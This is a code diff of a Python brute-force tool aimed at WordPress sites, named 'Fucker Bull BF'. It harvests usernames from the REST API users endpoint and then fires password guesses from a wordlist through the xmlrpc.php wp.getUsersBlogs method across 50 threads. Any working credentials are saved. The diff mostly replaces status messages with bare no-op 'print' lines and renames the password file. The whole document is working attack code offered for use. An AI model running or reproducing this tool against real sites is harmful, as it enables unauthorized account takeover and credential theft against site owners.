@@ -2,18 +2,18 @@ import requests,argparse,sys,json,time
 from termcolor import colored
 from concurrent.futures import ThreadPoolExecutor
 def fetching_user(url):
-	print(colored("[{}][*] User check. {}".format(local_time(),url), "blue"))
+	print
 	user_list = []
 	try:
 		req = requests.get(url+"/wp-json/wp/v2/users/", allow_redirects=False, timeout=0.5).content.decode('utf-8')
 		try:
-			print(colored("[{}][!] Found! {}".format(local_time(),url), "green"))
+			print
 			for x in json.loads(req):
 				user_list.append(x['slug'])
 		except ValueError:
-			pass
+			print
 	except Exception as e:
-		pass
+		print
 	return user_list
 def check_array(arr): 
     if len(arr) == 0: 
@@ -30,18 +30,17 @@ def save(format):
 def exploit(url, user_url, list_password):
 	try:
 		payloads = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""".format(user_url, list_password)
-
 		headers = {'Content-Type':'text/xml'}
 		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=0.5)
 		if "isAdmin" in str(r.content):
 			print(colored("[{}][+] User: [{}] Pass: [{}] Url: {} ".format(local_time(),user_url,list_password,url), "green"))
 			save("User [{}] Pass [{}] Url {}".format(user_url,list_password,url))
 		else:
-			pass
+			print
 	except requests.exceptions.ConnectionError as e:
-		pass
+		print
 	except Exception as e:
-			pass
+			print
 def brute_url(url):
 	try:
 		username_url = fetching_user(url)
@@ -50,9 +49,9 @@ def brute_url(url):
 			for username in username_url:
 				user.append(username)
 		else:
-			print(colored('[{}][+] User: [admin]'.format(local_time()), "green"))
+			print
 			user.append("admin")
-		password = "pass4.txt"
+		password = "passa.txt"
 		with ThreadPoolExecutor(max_workers=50) as executor:
 			for user_url in user:
 				with open(password, "r") as password_list:
@@ -60,9 +59,9 @@ def brute_url(url):
 						executor.submit(exploit,url,user_url,list_password)
 			user.clear()
 	except requests.exceptions.ConnectionError as e:
-		print(colored("[{}][!] ConnectionError :(".format(local_time()), "red"))
+		print
 	except Exception as e:
-		print(colored("[{}][!] Something Wrong :(".format(local_time()), "red"))
+		print
 def main():
  	try:
  		parser = argparse.ArgumentParser(description='Fucker Bull BF [Wordpress]')
